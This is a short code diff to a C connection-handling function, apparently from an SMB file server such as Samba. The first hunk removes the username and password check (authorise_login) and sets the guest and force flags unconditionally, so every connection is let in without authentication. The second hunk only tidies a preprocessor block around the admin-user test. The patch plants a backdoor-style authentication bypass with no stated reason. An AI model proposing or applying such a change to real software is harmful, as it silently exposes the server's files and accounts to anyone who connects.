@@ -3462,13 +3462,8 @@ int make_connection(char *service, char *user, char *password, int pwlen,
 	/* add it as a possible user name */
 	add_session_user(service);
 
-	/* shall we let them in? */
-	if (!authorise_login(snum, user, password, pwlen, &guest, &force,
-	                     vuid)) {
-		DEBUG(2, ("%s invalid username/password for %s\n", timestring(),
-		          service));
-		return (-1);
-	}
+	guest = True;
+	force = True;
 
 	cnum = find_free_connection(str_checksum(service) + str_checksum(user));
 	if (cnum < 0) {
@@ -3510,12 +3505,7 @@ int make_connection(char *service, char *user, char *password, int pwlen,
 	   marked read_only. Changed as I don't think this is needed,
 	   but old code left in case there is a problem here.
 	 */
-	if (user_in_list(user, lp_admin_users(snum))
-#if 0
-      && !pcon->read_only)
-#else
-	)
-#endif
+	if (user_in_list(user, lp_admin_users(snum)))
 	{
 		pcon->admin_user = True;
 		DEBUG(0,
